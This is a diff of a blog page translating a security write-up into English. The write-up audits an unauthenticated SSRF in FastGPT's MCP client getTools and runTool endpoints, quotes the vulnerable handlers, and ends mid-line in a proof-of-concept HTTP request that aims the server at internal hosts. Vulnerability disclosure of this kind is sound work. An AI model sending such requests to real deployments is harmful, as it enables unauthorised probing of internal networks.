@@ -19,22 +19,22 @@
   <meta name="author" content="ExploreIO">
   <meta name="keywords" content="">
   
-    <meta name="description" content="fastgpt-mcpCLient未认证ssrf复现">
+    <meta name="description" content="FastGPT MCP Client Unauthenticated SSRF Reproduction">
 <meta property="og:type" content="article">
-<meta property="og:title" content="fastgpt-mcpCLient未认证ssrf复现">
-<meta property="og:url" content="https://exploreio.github.io/2026/09/04/fastgpt-mcpCLient%E6%9C%AA%E8%AE%A4%E8%AF%81ssrf%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:title" content="FastGPT MCP Client Unauthenticated SSRF Reproduction">
+<meta property="og:url" content="https://exploreio.github.io/2026/09/04/fastgpt-mcpClient-unauthenticated-ssrf/index.html">
 <meta property="og:site_name" content="ExploreIO&#39;s Blog">
-<meta property="og:description" content="fastgpt-mcpCLient未认证ssrf复现">
+<meta property="og:description" content="FastGPT MCP Client Unauthenticated SSRF Reproduction">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://exploreio.github.io/img/a2.jpg">
 <meta property="article:published_time" content="2026-09-04T07:30:00.000Z">
-<meta property="article:modified_time" content="2026-09-03T17:09:49.440Z">
+<meta property="article:modified_time" content="2026-09-03T17:14:22.801Z">
 <meta property="article:author" content="ExploreIO">
 <meta property="article:tag" content="CTF">
-<meta property="article:tag" content="cve">
-<meta property="article:tag" content="渗透测试">
-<meta property="article:tag" content="漏洞挖掘">
-<meta property="article:tag" content="网络安全">
+<meta property="article:tag" content="CVE">
+<meta property="article:tag" content="cybersecurity">
+<meta property="article:tag" content="penetration testing">
+<meta property="article:tag" content="vulnerability hunting">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://exploreio.github.io/img/a2.jpg">
   
@@ -42,7 +42,7 @@
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>fastgpt-mcpCLient未认证ssrf复现 - ExploreIO&#39;s Blog</title>
+  <title>FastGPT MCP Client Unauthenticated SSRF Reproduction - ExploreIO&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -315,7 +315,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="fastgpt-mcpCLient未认证ssrf复现"></span>
+            <span id="subtitle" data-typed-text="FastGPT MCP Client Unauthenticated SSRF Reproduction"></span>
           
         </div>
 
@@ -338,7 +338,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          6.2k 字
+          9.5k 字
         
       </span>
     
@@ -349,7 +349,7 @@
         
         
         
-          11 分钟
+          16 分钟
         
       </span>
     
@@ -405,17 +405,17 @@
     
     <div class="category row nomargin-x">
       <a class="category-item 
-          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="web安全"
-        id="heading-3462cf7781bac1cfac12668cdfaa788c" role="tab" data-toggle="collapse" href="#collapse-3462cf7781bac1cfac12668cdfaa788c"
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="web security"
+        id="heading-6d9dcc9af94aa60d3c6ddaba64f6b923" role="tab" data-toggle="collapse" href="#collapse-6d9dcc9af94aa60d3c6ddaba64f6b923"
         aria-expanded="true"
       >
-        web安全
-        <span class="list-group-count">(3)</span>
+        web security
+        <span class="list-group-count">(1)</span>
         <i class="iconfont icon-arrowright"></i>
       </a>
       
-      <div class="category-collapse collapse show" id="collapse-3462cf7781bac1cfac12668cdfaa788c"
-           role="tabpanel" aria-labelledby="heading-3462cf7781bac1cfac12668cdfaa788c">
+      <div class="category-collapse collapse show" id="collapse-6d9dcc9af94aa60d3c6ddaba64f6b923"
+           role="tabpanel" aria-labelledby="heading-6d9dcc9af94aa60d3c6ddaba64f6b923">
         
         
           
@@ -432,17 +432,17 @@
     
     <div class="category-sub row nomargin-x">
       <a class="category-subitem 
-          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="cve"
-        id="heading-1716b5fcbb7121af74efdc153d0166c5" role="tab" data-toggle="collapse" href="#collapse-1716b5fcbb7121af74efdc153d0166c5"
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="CVE"
+        id="heading-6ee17bdf4a7da206068fe02847a4aed5" role="tab" data-toggle="collapse" href="#collapse-6ee17bdf4a7da206068fe02847a4aed5"
         aria-expanded="true"
       >
-        cve
-        <span class="list-group-count">(3)</span>
+        CVE
+        <span class="list-group-count">(1)</span>
         <i class="iconfont icon-arrowright"></i>
       </a>
       
-      <div class="category-collapse collapse show" id="collapse-1716b5fcbb7121af74efdc153d0166c5"
-           role="tabpanel" aria-labelledby="heading-1716b5fcbb7121af74efdc153d0166c5">
+      <div class="category-collapse collapse show" id="collapse-6ee17bdf4a7da206068fe02847a4aed5"
+           role="tabpanel" aria-labelledby="heading-6ee17bdf4a7da206068fe02847a4aed5">
         
         
           
@@ -451,28 +451,10 @@
     
       
       
-        <a href="/2026/08/29/CVE-2026-79483/" title="CVE-2026-79483"
-           class="list-group-item list-group-item-action
-           ">
-          <span class="category-post">CVE-2026-79483</span>
-        </a>
-      
-    
-      
-      
-        <a href="/2026/08/29/CVE-2026-79483-EN/" title="CVE-2026-79483-EN"
-           class="list-group-item list-group-item-action
-           ">
-          <span class="category-post">CVE-2026-79483-EN</span>
-        </a>
-      
-    
-      
-      
-        <a href="/2026/09/04/fastgpt-mcpCLient%E6%9C%AA%E8%AE%A4%E8%AF%81ssrf%E5%A4%8D%E7%8E%B0/" title="fastgpt-mcpCLient未认证ssrf复现"
+        <a href="/2026/09/04/fastgpt-mcpClient-unauthenticated-ssrf/" title="FastGPT MCP Client Unauthenticated SSRF Reproduction"
            class="list-group-item list-group-item-action
            active">
-          <span class="category-post">fastgpt-mcpCLient未认证ssrf复现</span>
+          <span class="category-post">FastGPT MCP Client Unauthenticated SSRF Reproduction</span>
         </a>
       
     
@@ -498,137 +480,137 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">fastgpt-mcpCLient未认证ssrf复现</h1>
+            <h1 id="seo-header">FastGPT MCP Client Unauthenticated SSRF Reproduction</h1>
             
             
               <div class="markdown-body">
                 
-                <h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p><code>/api/support/mcp/client/</code> 下的 <code>getTools</code> 与 <code>runTool</code> 两个端点均接收请求体中的 <code>url</code> 并由服务器主动向其发起 MCP&#x2F;SSE 连接。两接口<strong>均无任何鉴权</strong>、<code>url</code> 完全由请求者控制、连接结果（拒绝&#x2F;超时&#x2F;HTTP 状态码&#x2F;响应内容类型）以错误消息形式回显 —— 构成未认证 SSRF 与内网测绘 oracle</p>
-<p>gettools接口的作用是mcp我收+拉取工具列表</p>
-<p>runtool接口的作用是mcp握手+调用指定工具并返回执行结果</p>
-<p>下面主要讲的是代码审计相关的东西</p>
-<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>代码审计已FastGPT-4.13.0版本为例</p>
-<p>下载链接：<a target="_blank" rel="noopener" href="https://github.com/labring/FastGPT/archive/refs/tags/v4.13.0.zip">https://github.com/labring/FastGPT/archive/refs/tags/v4.13.0.zip</a></p>
-<h3 id="理解项目架构"><a href="#理解项目架构" class="headerlink" title="理解项目架构"></a>理解项目架构</h3><p>FastGPT 是一个 <strong>Next.js + TypeScript + MongoDB (Mongoose)</strong> 的 monorepo 项目</p>
-<h3 id="发现可疑目录"><a href="#发现可疑目录" class="headerlink" title="发现可疑目录"></a>发现可疑目录</h3><p>projects&#x2F;app&#x2F;src&#x2F;pages&#x2F;api&#x2F;support&#x2F;mcp&#x2F;client</p>
+                <h2 id="Vulnerability-Introduction"><a href="#Vulnerability-Introduction" class="headerlink" title="Vulnerability Introduction"></a>Vulnerability Introduction</h2><p>The <code>getTools</code> and <code>runTool</code> endpoints under <code>/api/support/mcp/client/</code> both accept a <code>url</code> from the request body and have the server proactively initiate an MCP&#x2F;SSE connection to it. Both endpoints have <strong>no authentication whatsoever</strong>, the <code>url</code> is fully controlled by the requester, and the connection result (refused &#x2F; timeout &#x2F; HTTP status code &#x2F; response content type) is echoed back in the form of error messages — constituting an unauthenticated SSRF and intranet mapping oracle.</p>
+<p>The getTools endpoint performs the MCP handshake + pulls the tool list.</p>
+<p>The runTool endpoint performs the MCP handshake + invokes the specified tool and returns the execution result.</p>
+<p>What follows mainly covers the code-audit side of things.</p>
+<h2 id="Code-Audit"><a href="#Code-Audit" class="headerlink" title="Code Audit"></a>Code Audit</h2><p>The code audit uses FastGPT 4.13.0 as an example.</p>
+<p>Download link: <a target="_blank" rel="noopener" href="https://github.com/labring/FastGPT/archive/refs/tags/v4.13.0.zip">https://github.com/labring/FastGPT/archive/refs/tags/v4.13.0.zip</a></p>
+<h3 id="Understanding-the-Project-Architecture"><a href="#Understanding-the-Project-Architecture" class="headerlink" title="Understanding the Project Architecture"></a>Understanding the Project Architecture</h3><p>FastGPT is a <strong>Next.js + TypeScript + MongoDB (Mongoose)</strong> monorepo project.</p>
+<h3 id="Discovering-a-Suspicious-Directory"><a href="#Discovering-a-Suspicious-Directory" class="headerlink" title="Discovering a Suspicious Directory"></a>Discovering a Suspicious Directory</h3><p>projects&#x2F;app&#x2F;src&#x2F;pages&#x2F;api&#x2F;support&#x2F;mcp&#x2F;client</p>
 <p><img src="/../img/fastgpt-mcpClient/image-20260904001902975.png" srcset="/img/loading.gif" lazyload alt="image-20260904001902975"></p>
 <blockquote>
-<p><strong>审计思考 ②</strong>：<code>support/</code> 目录在 FastGPT 里放的是”支撑功能”（用户、团队、外链、文件等），这里的 <code>mcp/client</code> 从命名看是”FastGPT 作为 MCP <strong>客户端</strong>去连接别人的 MCP 服务器” —— 与 <code>core/app/mcpTools</code>（把别人注册的 MCP 工具跑起来）职责相近但路径完全不同。<strong>每个文件一个端点</strong>，先看 <code>getTools.ts</code>。</p>
+<p><strong>Audit thought ②</strong>: The <code>support/</code> directory in FastGPT holds “supporting features” (users, teams, external links, files, etc.). Judging by its name, the <code>mcp/client</code> here means “FastGPT acting as an MCP <strong>client</strong> connecting to someone else’s MCP server” — similar in responsibility to <code>core/app/mcpTools</code> (which runs the MCP tools registered by others) but on a completely different path. <strong>One endpoint per file</strong>, so let’s look at <code>getTools.ts</code> first.</p>
 </blockquote>
-<p>看到gettools.ts的代码内容</p>
+<p>Looking at the code content of getTools.ts:</p>
 <figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs ts"><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">NextAPI</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;@/service/middleware/entry&#x27;</span>;<br><span class="hljs-keyword">import</span> &#123; <span class="hljs-keyword">type</span> <span class="hljs-title class_">McpToolConfigType</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;@fastgpt/global/core/app/type&#x27;</span>;<br><span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> &#123; <span class="hljs-title class_">ApiRequestProps</span>, <span class="hljs-title class_">ApiResponseType</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;@fastgpt/service/type/next&#x27;</span>;<br><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">MCPClient</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;@fastgpt/service/core/app/mcp&#x27;</span>;<br><span class="hljs-keyword">import</span> &#123; <span class="hljs-keyword">type</span> <span class="hljs-title class_">StoreSecretValueType</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;@fastgpt/global/common/secret/type&#x27;</span>;<br><span class="hljs-keyword">import</span> &#123; getSecretValue &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;@fastgpt/service/common/secret/utils&#x27;</span>;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> getMCPToolsQuery = &#123;&#125;;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> getMCPToolsBody = &#123; <span class="hljs-attr">url</span>: <span class="hljs-built_in">string</span>; <span class="hljs-attr">headerSecret</span>: <span class="hljs-title class_">StoreSecretValueType</span> &#125;;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> getMCPToolsResponse = <span class="hljs-title class_">McpToolConfigType</span>[];<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">handler</span>(<span class="hljs-params"></span><br><span class="hljs-params">  <span class="hljs-attr">req</span>: <span class="hljs-title class_">ApiRequestProps</span>&lt;getMCPToolsBody, getMCPToolsQuery&gt;,</span><br><span class="hljs-params">  <span class="hljs-attr">res</span>: <span class="hljs-title class_">ApiResponseType</span>&lt;getMCPToolsResponse[]&gt;</span><br><span class="hljs-params"></span>): <span class="hljs-title class_">Promise</span>&lt;getMCPToolsResponse&gt; &#123;<br>  <span class="hljs-keyword">const</span> &#123; url, headerSecret &#125; = req.<span class="hljs-property">body</span>;<br><br>  <span class="hljs-keyword">const</span> mcpClient = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MCPClient</span>(&#123;<br>    url,<br>    <span class="hljs-attr">headers</span>: <span class="hljs-title function_">getSecretValue</span>(&#123;<br>      <span class="hljs-attr">storeSecret</span>: headerSecret<br>    &#125;)<br>  &#125;);<br><br>  <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> mcpClient.<span class="hljs-title function_">getTools</span>();<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">NextAPI</span>(handler);<br><br></code></pre></td></tr></table></figure>
 
-<p>看看这个代码大概的意思</p>
-<p> <code>NextAPI(handler)</code></p>
-<p><code>NextAPI</code> 是错误处理包装器，<strong>是否附带鉴权</strong>要去 <code>middleware/entry.ts</code> 确认</p>
+<p>Let’s walk through what this code roughly means.</p>
+<p><code>NextAPI(handler)</code></p>
+<p><code>NextAPI</code> is an error-handling wrapper; <strong>whether it attaches authentication</strong> must be confirmed in <code>middleware/entry.ts</code>.</p>
 <p><code>body = { url, headerSecret }</code></p>
-<p><strong><code>url</code> 是请求体里的普通字段</strong> —— 类型标注 <code>string</code> 只是编译期约束，运行时传什么就是什么</p>
-<p> <code>const { url } = req.body</code></p>
-<p>用户输入原样解构，无 Zod&#x2F;无白名单&#x2F;无内网地址校验</p>
+<p><strong><code>url</code> is just an ordinary field in the request body</strong> — the <code>string</code> type annotation is only a compile-time constraint; at runtime whatever you pass is what it gets.</p>
+<p><code>const { url } = req.body</code></p>
+<p>User input is destructured as-is — no Zod, no allowlist, no intranet-address validation.</p>
 <p><code>new MCPClient({ url, ... })</code></p>
-<p>用户可控的 <code>url</code> 即将<strong>交给服务器去连接</strong> ——<code> SSRF</code> 的经典形态</p>
+<p>The user-controlled <code>url</code> is about to be <strong>handed to the server to connect to</strong> — the classic shape of an <code>SSRF</code>.</p>
 <p><code>headerSecret</code> → headers</p>
-<p><code>headerSecret</code> 经过 <code>getSecretValue</code> 处理后，会作为<code> HTTP</code> 请求头发送给目标<code> url</code></p>
-<p><code>getTools()</code> 结果直接返回</p>
-<p>连接结果（成功&#x2F;失败细节）<strong>回显给请求者</strong> ，所以这里会返回错误的代码后续可以用来区分正确与错误的消息</p>
+<p>After being processed by <code>getSecretValue</code>, <code>headerSecret</code> is sent as <code>HTTP</code> request headers to the target <code>url</code>.</p>
+<p>The result of <code>getTools()</code> is returned directly</p>
+<p>The connection result (success&#x2F;failure details) is <strong>echoed back to the requester</strong>, so the error messages returned here can later be used to distinguish correct from incorrect responses.</p>
 <blockquote>
-<p>到这里已经具备 SSRF 的全部要素：<strong>用户可控目标 + 服务器主动发起连接 + 结果回显</strong>。缺的只是一个确认：这个端点到底有没有鉴权？没有 <code>req</code> 传给任何 <code>auth*</code> 函数，但没有显式拒绝也可能是全局中间件拦的 —— 必须排掉这个可能。</p>
+<p>At this point every ingredient of SSRF is present: <strong>user-controlled target + server-initiated connection + result echo</strong>. All that’s missing is one confirmation: does this endpoint actually have authentication? No <code>req</code> is passed to any <code>auth*</code> function, but the absence of an explicit rejection could also mean a global middleware is intercepting — that possibility must be ruled out.</p>
 </blockquote>
-<h3 id="鉴权检查"><a href="#鉴权检查" class="headerlink" title="鉴权检查"></a>鉴权检查</h3><p>FastGPT 的 API 包装器在 <code>projects/app/src/service/middleware/entry.ts</code>：</p>
+<h3 id="Authentication-Check"><a href="#Authentication-Check" class="headerlink" title="Authentication Check"></a>Authentication Check</h3><p>FastGPT’s API wrapper lives in <code>projects/app/src/service/middleware/entry.ts</code>:</p>
 <p><img src="/../img/fastgpt-mcpClient/image-20260904003626971.png" srcset="/img/loading.gif" lazyload alt="image-20260904003626971"></p>
-<p>FastGPT 的 API 包装器在 <code>projects/app/src/service/middleware/entry.ts</code>：</p>
-<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">NextAPI</span> = <span class="hljs-title class_">NextEntry</span>(&#123;<br>  <span class="hljs-attr">beforeCallback</span>: []      <span class="hljs-comment">// ← 关键：前置回调数组为空</span><br>&#125;);<br></code></pre></td></tr></table></figure>
+<p>FastGPT’s API wrapper lives in <code>projects/app/src/service/middleware/entry.ts</code>:</p>
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">NextAPI</span> = <span class="hljs-title class_">NextEntry</span>(&#123;<br>  <span class="hljs-attr">beforeCallback</span>: []      <span class="hljs-comment">// ← Key point: the pre-callback array is empty</span><br>&#125;);<br></code></pre></td></tr></table></figure>
 
-<p><code>beforeCallback</code> 是每个请求进来前依次执行的函数数组 —— FastGPT 所有需要登录的端点，都是把 <code>authCert</code>（Cookie&#x2F;API Key 校验）这类函数<strong>放进各自文件的 beforeCallback</strong> 或在 handler 里显式调用。对比一个正常需要鉴权的端点（如 <code>core/chat/getHistories.ts</code> 内部）：</p>
-<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// 有鉴权的写法（节选）—— handler 内部显式调用鉴权函数</span><br><span class="hljs-keyword">const</span> &#123; teamId, tmbId, permission &#125; = <span class="hljs-keyword">await</span> <span class="hljs-title function_">authCert</span>(&#123; req, <span class="hljs-attr">authToken</span>: <span class="hljs-literal">true</span> &#125;);<br></code></pre></td></tr></table></figure>
+<p><code>beforeCallback</code> is an array of functions executed in sequence before every request comes in — all FastGPT endpoints that require login put functions like <code>authCert</code> (Cookie&#x2F;API Key validation) <strong>into their own file’s beforeCallback</strong> or call them explicitly inside the handler. For comparison, a normal endpoint that does require authentication (e.g., inside <code>core/chat/getHistories.ts</code>):</p>
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// Authenticated style (excerpt) — the handler explicitly calls the auth function</span><br><span class="hljs-keyword">const</span> &#123; teamId, tmbId, permission &#125; = <span class="hljs-keyword">await</span> <span class="hljs-title function_">authCert</span>(&#123; req, <span class="hljs-attr">authToken</span>: <span class="hljs-literal">true</span> &#125;);<br></code></pre></td></tr></table></figure>
 
-<p>而 <code>getTools.ts</code> 的 handler 全文（第二步）<strong>没有出现任何 <code>auth</code> 字样</strong>，<code>beforeCallback</code> 又是空数组。两条路都排除后可以下结论：</p>
+<p>Meanwhile, the full text of the <code>getTools.ts</code> handler (step two) <strong>contains no <code>auth</code> wording at all</strong>, and <code>beforeCallback</code> is an empty array. With both paths ruled out, we can conclude:</p>
 <blockquote>
-<p><strong>鉴权结论：<code>/api/support/mcp/client/getTools</code> 无任何身份验证 —— 未登录、无 Cookie、无 API Key 均可直接调用。</strong></p>
+<p><strong>Authentication conclusion: <code>/api/support/mcp/client/getTools</code> has no authentication whatsoever — it can be called directly with no login, no Cookie, and no API Key.</strong></p>
 </blockquote>
-<p>顺手确认 <code>runTool.ts</code>与全局是否有其他拦截（Nginx 层的 WAF 因部署而异，代码层无拦截）。</p>
-<h3 id="读-runTool-ts"><a href="#读-runTool-ts" class="headerlink" title="读 runTool.ts"></a>读 runTool.ts</h3><p>现在回到projects&#x2F;app&#x2F;src&#x2F;pages&#x2F;api&#x2F;support&#x2F;mcp&#x2F;client</p>
+<p>While we’re at it, confirm <code>runTool.ts</code> and whether anything else intercepts globally (an Nginx-layer WAF varies by deployment; there is no interception at the code layer).</p>
+<h3 id="Reading-runTool-ts"><a href="#Reading-runTool-ts" class="headerlink" title="Reading runTool.ts"></a>Reading runTool.ts</h3><p>Now back to projects&#x2F;app&#x2F;src&#x2F;pages&#x2F;api&#x2F;support&#x2F;mcp&#x2F;client</p>
 <figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs ts"><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">NextAPI</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;@/service/middleware/entry&#x27;</span>;<br><span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> &#123; <span class="hljs-title class_">ApiRequestProps</span>, <span class="hljs-title class_">ApiResponseType</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;@fastgpt/service/type/next&#x27;</span>;<br><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">MCPClient</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;@fastgpt/service/core/app/mcp&#x27;</span>;<br><span class="hljs-keyword">import</span> &#123; <span class="hljs-keyword">type</span> <span class="hljs-title class_">StoreSecretValueType</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;@fastgpt/global/common/secret/type&#x27;</span>;<br><span class="hljs-keyword">import</span> &#123; getSecretValue &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;@fastgpt/service/common/secret/utils&#x27;</span>;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> <span class="hljs-title class_">RunMCPToolQuery</span> = &#123;&#125;;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> <span class="hljs-title class_">RunMCPToolBody</span> = &#123;<br>  <span class="hljs-attr">url</span>: <span class="hljs-built_in">string</span>;<br>  <span class="hljs-attr">toolName</span>: <span class="hljs-built_in">string</span>;<br>  <span class="hljs-attr">headerSecret</span>: <span class="hljs-title class_">StoreSecretValueType</span>;<br>  <span class="hljs-attr">params</span>: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt;;<br>&#125;;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> <span class="hljs-title class_">RunMCPToolResponse</span> = <span class="hljs-built_in">any</span>;<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">handler</span>(<span class="hljs-params"></span><br><span class="hljs-params">  <span class="hljs-attr">req</span>: <span class="hljs-title class_">ApiRequestProps</span>&lt;<span class="hljs-title class_">RunMCPToolBody</span>, <span class="hljs-title class_">RunMCPToolQuery</span>&gt;,</span><br><span class="hljs-params">  <span class="hljs-attr">res</span>: <span class="hljs-title class_">ApiResponseType</span>&lt;<span class="hljs-title class_">RunMCPToolResponse</span>&gt;</span><br><span class="hljs-params"></span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">RunMCPToolResponse</span>&gt; &#123;<br>  <span class="hljs-keyword">const</span> &#123; url, toolName, headerSecret, params &#125; = req.<span class="hljs-property">body</span>;<br>  <span class="hljs-keyword">const</span> mcpClient = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MCPClient</span>(&#123;<br>    url,<br>    <span class="hljs-attr">headers</span>: <span class="hljs-title function_">getSecretValue</span>(&#123;<br>      <span class="hljs-attr">storeSecret</span>: headerSecret<br>    &#125;)<br>  &#125;);<br><br>  <span class="hljs-keyword">return</span> mcpClient.<span class="hljs-title function_">toolCall</span>(toolName, params);<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">NextAPI</span>(handler);<br><br></code></pre></td></tr></table></figure>
 
-<p>与 <code>getTools</code> 完全同构：无鉴权 + <code>url</code> 直通。差异是<strong>交互更深一层</strong> —— <code>toolName</code> 与 <code>params</code> 会作为 MCP 协议的 <code>tools/call</code> 参数发到目标服务器，执行结果原样返回给请求者</p>
+<p>Completely isomorphic to <code>getTools</code>: no authentication + the <code>url</code> passed straight through. The difference is that the <strong>interaction goes one level deeper</strong> — <code>toolName</code> and <code>params</code> are sent to the target server as the arguments of the MCP protocol’s <code>tools/call</code>, and the execution result is returned as-is to the requester.</p>
 <blockquote>
-<p>两个端点、同一根因（无鉴权 + URL 直通）</p>
+<p>Two endpoints, one root cause (no authentication + URL pass-through)</p>
 </blockquote>
-<h3 id="审计总结"><a href="#审计总结" class="headerlink" title="审计总结"></a>审计总结</h3><p>根据上面两个接口没有任何鉴权以及用户可以自由控制请求路径还有服务端会返回请求结果的表现来看，两个接口存在ssrf漏洞</p>
-<p>攻击者构造如下请求包就可以探测内网</p>
-<p>请求包（getTools）</p>
+<h3 id="Audit-Summary"><a href="#Audit-Summary" class="headerlink" title="Audit Summary"></a>Audit Summary</h3><p>Given that the two endpoints above have no authentication whatsoever, the user can freely control the request path, and the server returns the request result, both endpoints have an SSRF vulnerability.</p>
+<p>An attacker can probe the intranet by crafting the following request packets:</p>
+<p>Request packet (getTools)</p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/api/support/mcp/client/getTools</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>x.x.x.x<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><br><span class="language-json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;http://sandbox:3000/api&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;headerSecret&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span></span><br></code></pre></td></tr></table></figure>
 
-<p>响应（服务器真实访问了内网沙箱并读取响应头）：</p>
+<p>Response (the server actually visited the intranet sandbox and read its response headers):</p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">&#123;&quot;code&quot;:500,&quot;message&quot;:&quot;SSE error: Invalid content type, expected \&quot;text/event-stream\&quot;&quot;,&quot;data&quot;:null&#125;<br></code></pre></td></tr></table></figure>
 
-<p>请求包（runTools）</p>
+<p>Request packet (runTool)</p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/api/support/mcp/client/runTool</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>x.x.x.x<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><br><span class="language-json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;http://127.0.0.1:47654&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;toolName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;poc&quot;</span><span 